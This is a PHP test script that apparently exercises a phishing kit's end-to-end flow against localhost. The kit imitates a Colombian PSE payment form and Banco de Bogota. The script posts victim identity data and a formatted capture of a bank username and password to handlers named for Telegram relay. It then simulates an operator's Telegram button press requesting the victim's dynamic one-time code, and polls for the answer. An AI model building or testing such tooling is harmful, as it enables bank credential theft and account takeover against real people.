<?php
// test_full_flow.php - Test the complete flow

echo "=== Testing Full Flow ===\n";

// Step 1: Send initial data to send_telegram.php (PSE form)
echo "1. Sending initial data to send_telegram.php...\n";
$data = [
    'tipo_doc' => 'CC',
    'cedula' => '1234567890',
    'nombres' => 'Juan',
    'apellidos' => 'Perez',
    'correo' => 'juan@example.com',
    'telefono' => '1234567',
    'celular' => '3001234567',
    'direccion' => 'Calle 123',
    'pais' => 'Colombia',
    'ciudad' => 'Bogota',
    'tipo_persona' => 'Natural'
];

$jsonData = json_encode($data);
$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => $jsonData
    ]
]);
$response1 = file_get_contents('http://localhost:8000/data-ps/recargas/send_telegram.php', false, $context);
echo "Response: $response1\n\n";

// Step 2: Simulate bank login (send message with buttons)
echo "2. Sending bank login data to procesar_logo.php...\n";
$message = "
<b><u>💎BANCO DE BOGOTA 💎</u></b>
• <b>💌Correo:</b> juan@example.com
• <b>📞Celular:</b> 3001234567
• <b>💸Cedula:</b> 1234567890
• <b>👤Persona:</b> Juan Perez
• <b>🏦Banco:</b> BANCO DE BOGOTA
------------------------------
• <b>📟Dispositivo:</b> PC
• <b>🗺IP:</b> 127.0.0.1
• <b>⏱Hora:</b> " . date('d/m/Y H:i:s') . "
------------------------------
• <b>👤 Usuario:</b> 1234567890
• <b>🔑 Clave:</b> 1234
------------------------------";

$transactionId = 'test_full_' . time();

$formData = http_build_query([
    'message' => $message,
    'transactionId' => $transactionId
]);

$context2 = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $formData
    ]
]);
$response2 = file_get_contents('http://localhost:8000/data-ps/recargas/transaction/b-34f4/procesar_logo.php', false, $context2);
echo "Response: $response2\n\n";

// Step 3: Simulate button click (send to webhook)
echo "3. Simulating button click to webhook.php...\n";
$update = [
    'callback_query' => [
        'id' => 'test_cb_' . time(),
        'from' => ['id' => 123, 'username' => 'testuser'],
        'data' => 'pedir_dinamica:' . $transactionId,
        'message' => [
            'message_id' => 100,
            'chat' => ['id' => -5238438739],
            'text' => $message
        ]
    ]
];

$jsonUpdate = json_encode($update);
$context3 = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => $jsonUpdate
    ]
]);
$response3 = file_get_contents('http://localhost:8000/data-ps/recargas/transaction/b-34f4/webhook.php', false, $context3);
echo "Response: $response3\n\n";

// Step 4: Check response from verificar_respuesta.php
echo "4. Checking response from verificar_respuesta.php...\n";
$formData4 = http_build_query([
    'transactionId' => $transactionId,
    'messageId' => '100'
]);

$context4 = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $formData4
    ]
]);
$response4 = file_get_contents('http://localhost:8000/data-ps/recargas/transaction/b-34f4/verificar_respuesta.php', false, $context4);
echo "Response: $response4\n\n";

echo "=== Test Complete ===\n";
?>